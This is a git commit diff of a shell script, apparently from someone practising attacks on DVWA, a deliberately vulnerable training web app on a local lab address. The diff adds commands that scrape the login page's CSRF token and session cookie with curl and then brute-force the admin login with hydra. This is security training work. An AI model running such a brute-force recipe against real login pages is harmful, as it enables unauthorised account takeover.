5ed2d6bdff63ab13fc77771a7966607a5f0ea0ac
C0nsultant <anokfireball@posteo.de>
2016-03-08 22:32:44 +0100

    Brutforceing main login - broke the main login

--- 1_login/1_CSRF.sh
+++ 1_login/1_CSRF.sh
@@ -18,11 +18,15 @@
 # diff test try1
 #
 #Figure out how to use CSRF token
-# CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
+CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
 # curl -s -i -L -b dvwa.cookie -d $'username=username&password=password&Login=Login&user_token={CSRF}' 192.168.178.98/dvwa/login.php > try1
 # curl -s -i -L -b dvwa.cookie -d $'username=test&password=test&Login=Login&user_token={CSRF}' 192.168.178.98/dvwa/login.php > try2
 # curl -s -i -L -b dvwa.cookie -d $'username=foo&password=bar&Login=Login&user_token={CSRF}' 192.168.178.98/dvwa/login.php > try3
 #Check for differences between request with same token
 # diff try1 try3
 #
+#Get php session id
+SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
 #Figure out how to use hydra for this purpose
+rm -f hydra.restore
+hydra -l admin -p password -u -F -t 1 -w 10 -W 1 -V 192.168.178.98 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=${CSRF}:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}:C=/404.php"
